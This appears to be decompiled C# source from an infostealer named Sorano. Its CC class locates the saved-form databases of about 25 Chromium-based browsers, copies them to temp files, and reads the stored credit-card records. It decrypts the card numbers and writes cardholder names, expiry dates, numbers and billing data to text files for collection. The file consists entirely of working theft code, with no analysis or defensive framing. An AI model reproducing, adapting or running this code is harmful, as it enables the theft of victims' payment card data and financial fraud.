using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Sorano.Cards;
using Sorano.Stealer;

// Token: 0x02000003 RID: 3
internal static class CC
{
	// Token: 0x06000004 RID: 4 RVA: 0x00002894 File Offset: 0x00000A94
	public static void grab_cards(string string_0)
	{
		string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
		string[] array = new string[]
		{
			environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Web Data",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data",
			environmentVariable + "\\Kometa\\User Data\\Default\\Web Data",
			environmentVariable + "\\Orbitum\\User Data\\Default\\Web Data",
			environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Web Data",
			environmentVariable + "\\Amigo\\User\\User Data\\Default\\Web Data",
			environmentVariable + "\\Torch\\User Data\\Default\\Web Data",
			environmentVariable + "\\CentBrowser\\User Data\\Default\\Web Data",
			environmentVariable + "\\Go!\\User Data\\Default\\Web Data",
			environmentVariable + "\\uCozMedia\\Uran\\User Data\\Default\\Web Data",
			environmentVariable + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Web Data",
			environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Web Data",
			environmentVariable + "\\BlackHawk\\User Data\\Default\\Web Data",
			environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Web Data",
			environmentVariable + "\\CoolNovo\\User Data\\Default\\Web Data",
			environmentVariable + "\\Epic Browser\\User Data\\Default\\Web Data",
			environmentVariable + "\\Baidu Spark\\User Data\\Default\\Web Data",
			environmentVariable + "\\Rockmelt\\User Data\\Default\\Web Data",
			environmentVariable + "\\Sleipnir\\User Data\\Default\\Web Data",
			environmentVariable + "\\SRWare Iron\\User Data\\Default\\Web Data",
			environmentVariable + "\\Titan Browser\\User Data\\Default\\Web Data",
			environmentVariable + "\\Flock\\User Data\\Default\\Web Data",
			environmentVariable + "\\Vivaldi\\User Data\\Default\\Web Data",
			environmentVariable + "\\Sputnik\\User Data\\Default\\Web Data",
			environmentVariable + "\\Maxthon\\User Data\\Default\\Web Data"
		};
		foreach (string text in array)
		{
			try
			{
				string str = "";
				bool flag = text.Contains("Chrome");
				if (flag)
				{
					str = "Google";
				}
				bool flag2 = text.Contains("Yandex");
				if (flag2)
				{
					str = "Yandex";
				}
				bool flag3 = text.Contains("Orbitum");
				if (flag3)
				{
					str = "Orbitum";
				}
				bool flag4 = text.Contains("Opera");
				if (flag4)
				{
					str = "Opera";
				}
				bool flag5 = text.Contains("Amigo");
				if (flag5)
				{
					str = "Amigo";
				}
				bool flag6 = text.Contains("Torch");
				if (flag6)
				{
					str = "Torch";
				}
				bool flag7 = text.Contains("Comodo");
				if (flag7)
				{
					str = "Comodo";
				}
				bool flag8 = text.Contains("CentBrowser");
				if (flag8)
				{
					str = "CentBrowser";
				}
				bool flag9 = text.Contains("Go!");
				if (flag9)
				{
					str = "Go!";
				}
				bool flag10 = text.Contains("uCozMedia");
				if (flag10)
				{
					str = "uCozMedia";
				}
				bool flag11 = text.Contains("MapleStudio");
				if (flag11)
				{
					str = "MapleStudio";
				}
				bool flag12 = text.Contains("BlackHawk");
				if (flag12)
				{
					str = "BlackHawk";
				}
				bool flag13 = text.Contains("CoolNovo");
				if (flag13)
				{
					str = "CoolNovo";
				}
				bool flag14 = text.Contains("Vivaldi");
				if (flag14)
				{
					str = "Vivaldi";
				}
				bool flag15 = text.Contains("Sputnik");
				if (flag15)
				{
					str = "Sputnik";
				}
				bool flag16 = text.Contains("Maxthon");
				if (flag16)
				{
					str = "Maxthon";
				}
				bool flag17 = text.Contains("AcWebBrowser");
				if (flag17)
				{
					str = "AcWebBrowser";
				}
				bool flag18 = text.Contains("Epic Browser");
				if (flag18)
				{
					str = "Epic Browser";
				}
				bool flag19 = text.Contains("Baidu Spark");
				if (flag19)
				{
					str = "Baidu Spark";
				}
				bool flag20 = text.Contains("Rockmelt");
				if (flag20)
				{
					str = "Rockmelt";
				}
				bool flag21 = text.Contains("Sleipnir");
				if (flag21)
				{
					str = "Sleipnir";
				}
				bool flag22 = text.Contains("SRWare Iron");
				if (flag22)
				{
					str = "SRWare Iron";
				}
				bool flag23 = text.Contains("Titan Browser");
				if (flag23)
				{
					str = "Titan Browser";
				}
				bool flag24 = text.Contains("Flock");
				if (flag24)
				{
					str = "Flock";
				}
				try
				{
					List<CardData> list = CC.fetch_cookies(text);
					bool flag25 = list != null;
					if (flag25)
					{
						Directory.CreateDirectory(string_0 + "\\CC\\");
						using (StreamWriter streamWriter = new StreamWriter(string_0 + "\\CC\\" + str + "_CC.txt"))
						{
							foreach (CardData cardData in list)
							{
								streamWriter.Write(string.Concat(new string[]
								{
									cardData.Name,
									"\t",
									cardData.Exp_m,
									"\t",
									cardData.Exp_y,
									"\t",
									cardData.Number,
									"\t",
									cardData.Billing,
									"\r\n"
								}));
							}
						}
					}
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
	}

	// Token: 0x06000005 RID: 5 RVA: 0x00002E54 File Offset: 0x00001054
	private static List<CardData> fetch_cookies(string string_0)
	{
		bool flag = !File.Exists(string_0);
		List<CardData> result;
		if (flag)
		{
			result = null;
		}
		else
		{
			try
			{
				string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
				bool flag2 = File.Exists(text);
				if (flag2)
				{
					File.Delete(text);
				}
				File.Copy(string_0, text, true);
				Sqlite sqlite = new Sqlite(text);
				sqlite.ReadTable("CC");
				List<CardData> list = new List<CardData>();
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					try
					{
						string number = string.Empty;
						try
						{
							number = Encoding.UTF8.GetString(Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 12)), null));
						}
						catch (Exception)
						{
						}
						bool flag3;
						bool.TryParse(sqlite.GetValue(i, 6), out flag3);
						list.Add(new CardData
						{
							Name = sqlite.GetValue(i, 1),
							Exp_m = sqlite.GetValue(i, 2),
							Exp_y = sqlite.GetValue(i, 3),
							Number = number,
							Billing = sqlite.GetValue(i, 9)
						});
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
					}
				}
				result = list;
			}
			catch
			{
				result = new List<CardData>();
			}
		}
		return result;
	}
}
